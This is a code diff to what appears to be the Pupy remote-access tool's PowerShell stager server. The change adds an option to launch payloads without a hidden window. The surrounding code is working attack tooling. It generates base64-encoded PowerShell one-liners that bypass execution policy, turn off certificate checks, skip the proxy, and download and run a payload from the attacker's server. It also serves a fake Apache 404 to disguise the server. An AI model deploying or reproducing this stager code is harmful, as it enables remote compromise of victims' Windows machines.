@@ -61,11 +61,12 @@ def create_ps_command(ps_command, force_ps32=False, nothidden=False):
     """.format(ps_command)
 
     if force_ps32:
-        command = """$command = '{}'
+        nothiddenArg = ""
+        if nothidden == False: nothiddenArg="-window hidden"
+        command = """$command = '{0}'
         if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64')
         {{
-
-            $exec = $Env:windir + '\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded ' + $command
+            $exec = $Env:windir + '\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass {1} -noni -nop -encoded ' + $command
             IEX $exec
         }}
         else
@@ -73,7 +74,7 @@ def create_ps_command(ps_command, force_ps32=False, nothidden=False):
             $exec = [System.Convert]::FromBase64String($command)
             $exec = [Text.Encoding]::Unicode.GetString($exec)
             IEX $exec
-        }}""".format(b64encode(ps_command.encode('UTF-16LE')))
+        }}""".format(b64encode(ps_command.encode('UTF-16LE')), nothiddenArg)
 
         if nothidden is True:
             command = 'powershell.exe -exec bypass -window maximized -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
@@ -109,7 +110,7 @@ class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
                 else:
                     launcher = "$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (New-Object Net.WebClient).DownloadString('https://%s:%s/%s');"%(self.server.link_ip,self.server.link_port,url_random_two)
 
-            launcher = create_ps_command(launcher, force_ps32=True, nothidden=False)
+            launcher = create_ps_command(launcher, force_ps32=True, nothidden=self.server.nothidden)
             self.wfile.write(launcher)
             print colorize("[+] ","green")+"[Stage 1/2] Powershell script served !"
 
@@ -130,13 +131,14 @@ class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
             self.wfile.write(APACHE_DEFAULT_404)
 
 class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
-    def set(self,conf, link_ip, port, sslEnabled, useTargetProxy):
+    def set(self,conf, link_ip, port, sslEnabled, useTargetProxy,nothidden):
         self.payload_conf = conf
         self.link_ip=link_ip
         self.link_port=port
         self.random_reflectivepeinj_name=''.join([random.choice(string.ascii_lowercase+string.ascii_uppercase+string.digits) for _ in range(0,random.randint(8,12))])
         self.useTargetProxy = useTargetProxy
         self.sslEnabled=sslEnabled
+        self.nothidden=nothidden
         if self.sslEnabled:
             credentials = Credentials()
             keystr = credentials['SSL_BIND_KEY']
@@ -163,11 +165,11 @@ class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
             pass
         self.socket.close()
 
-def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", useTargetProxy=False, sslEnabled=True):
+def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", useTargetProxy=False, sslEnabled=True, nothidden=False):
     try:
         try:
             server = ThreadedHTTPServer((ip, port),PupyPayloadHTTPHandler)
-            server.set(conf, link_ip, port, sslEnabled, useTargetProxy)
+            server.set(conf, link_ip, port, sslEnabled, useTargetProxy, nothidden)
         except Exception as e:
             # [Errno 98] Adress already in use
             raise
@@ -181,7 +183,10 @@ def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", useTar
             else:
                 a="[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};iex(New-Object System.Net.WebClient).DownloadString('https://%s:%s/%s')"%(link_ip, port, url_random_one)
                 b=b64encode(a.encode('UTF-16LE'))
-            oneliner=colorize("powershell.exe -w hidden -noni -nop -enc %s"%b, "green")
+            if nothidden==True:
+                oneliner=colorize("powershell.exe -noni -nop -enc %s"%b, "green")
+            else:
+                oneliner=colorize("powershell.exe -w hidden -noni -nop -enc %s"%b, "green")
             message=colorize("Please note that if the target's system uses a proxy, this previous powershell command will download/execute pupy through the proxy", "yellow")
         else:
             if not sslEnabled:
@@ -190,9 +195,15 @@ def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", useTar
             else:
                 a="$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};iex(New-Object System.Net.WebClient).DownloadString('https://%s:%s/%s')"%(link_ip, port, url_random_one)
                 b=b64encode(a.encode('UTF-16LE'))
-            oneliner=colorize("powershell.exe -w hidden -noni -nop -enc %s"%b, "green")
+                if nothidden==True:
+                    oneliner=colorize("powershell.exe -noni -nop -enc %s"%b, "green")
+                else:
+                    oneliner=colorize("powershell.exe -w hidden -noni -nop -enc %s"%b, "green")
             message= colorize("Please note that even if the target's system uses a proxy, this previous powershell command will not use the proxy for downloading pupy", "yellow")
-        print colorize("powershell.exe -w hidden -noni -nop -c \"%s\""%a, "green")
+        if nothidden==True:
+            print colorize("powershell.exe -noni -nop -c \"%s\""%a, "green")
+        else:
+            print colorize("powershell.exe -w hidden -noni -nop -c \"%s\""%a, "green")
         print " --- "
         print oneliner
         print " --- "
